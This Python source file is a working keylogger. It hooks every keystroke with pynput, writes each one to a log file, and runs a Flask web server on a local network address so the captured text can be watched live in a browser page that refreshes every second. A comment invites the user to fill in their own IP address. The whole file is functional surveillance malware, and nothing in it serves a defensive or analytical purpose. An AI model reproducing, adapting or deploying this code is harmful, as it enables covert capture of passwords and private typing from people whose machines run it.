from flask import Flask, render_template_string
import threading
import pynput.keyboard
import os

app = Flask(__name__)

LOG_FILE = "log.txt"

keystrokes = []

if not os.path.exists(LOG_FILE):
    open(LOG_FILE, "w").close()

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Live Keylogger</title>
    <meta http-equiv="refresh" content="1"> <!-- Refresh every second -->
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        pre { background: #222; color: #0f0; padding: 10px; font-size: 18px; }
    </style>
</head>
<body>
    <h1>Live Keystroke Logger</h1>
    <p>Keystrokes captured:</p>
    <pre>{{ log }}</pre>
</body>
</html>
"""

def process_key_press(key):
    try:
        keystroke = key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            keystroke = " "
        elif key == pynput.keyboard.Key.enter:
            keystroke = "\n"
        elif key == pynput.keyboard.Key.backspace:
            keystroke = " [BS] "
        else:
            keystroke = f" [{str(key).replace('Key.', '').upper()}] "
    
    keystrokes.append(keystroke)
    
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(keystroke)

def start_keylogger():
    with pynput.keyboard.Listener(on_press=process_key_press) as listener:
        listener.join()

@app.route('/')
def index():
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as file:
            log_data = file.read()
    except Exception as e:
        log_data = f"Error reading log file: {e}"
    
    return render_template_string(html_template, log=log_data)


if __name__ == "__main__":
    
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    app.run(host="192.168.0.104", port=5000, debug=False) #Give your IP Address over here in the host section
